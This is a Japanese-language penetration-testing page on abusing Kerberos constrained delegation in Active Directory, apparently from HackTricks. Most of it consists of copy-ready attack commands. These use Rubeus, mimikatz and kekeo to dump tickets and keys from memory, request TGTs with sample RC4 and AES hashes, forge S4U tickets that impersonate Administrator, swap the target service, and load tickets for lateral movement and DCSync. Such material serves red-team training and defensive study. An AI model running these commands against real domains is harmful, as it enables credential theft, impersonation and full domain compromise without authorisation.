# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

これを使用すると、ドメイン管理者はコンピュータに対して任意のマシンの任意のサービスに対して**ユーザーまたはコンピュータを偽装する**ことを**許可**できます。

- **ユーザー自身のためのサービス (_S4U2self_):** もし**サービスアカウント**が _userAccountControl_ 値に [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) を含んでいる場合、そのアカウントは他の任意のユーザーの代わりに自分自身（サービス）のためにTGSを取得できます。
- **プロキシのためのサービス (_S4U2proxy_):** **サービスアカウント**は、**msDS-AllowedToDelegateTo** に設定されたサービスのために任意のユーザーの代わりにTGSを取得できます。そのためには、まずそのユーザーから自分自身へのTGSが必要ですが、S4U2selfを使用してそのTGSを取得してから他のTGSを要求することができます。

**注意**: ユーザーがADで「_アカウントは敏感であり、委任できません_」とマークされている場合、そのユーザーを**偽装することはできません**。

これは、**サービスのハッシュを侵害した場合**、ユーザーを**偽装し**、指定されたマシン上の任意の**サービス**に対して彼らの代わりに**アクセス**を取得できることを意味します（可能な**特権昇格**）。

さらに、**ユーザーが偽装できるサービスへのアクセスだけでなく、任意のサービスへのアクセスも**得られます。なぜなら、SPN（要求されたサービス名）がチェックされていないからです（チケット内のこの部分は暗号化/署名されていません）。したがって、**CIFSサービス**へのアクセスがあれば、例えばRubeusの`/altservice`フラグを使用して**HOSTサービス**にもアクセスできます。

また、**DC上のLDAPサービスアクセス**は、**DCSync**を悪用するために必要です。
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
- ステップ 1: **許可されたサービスの TGT を取得する**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 他にも**TGTチケット**や**RC4**または**AES256**を取得する方法があります。例えば、プリンターバグや制約のない委任、NTLMリレー、Active Directory証明書サービスの悪用などです。
>
> **そのTGTチケット（またはハッシュ）を持っているだけで、コンピュータ全体を危険にさらすことなくこの攻撃を実行できます。**

- Step2: **ユーザーを偽装してサービスのTGSを取得する**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**詳細情報はired.teamをご覧ください。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
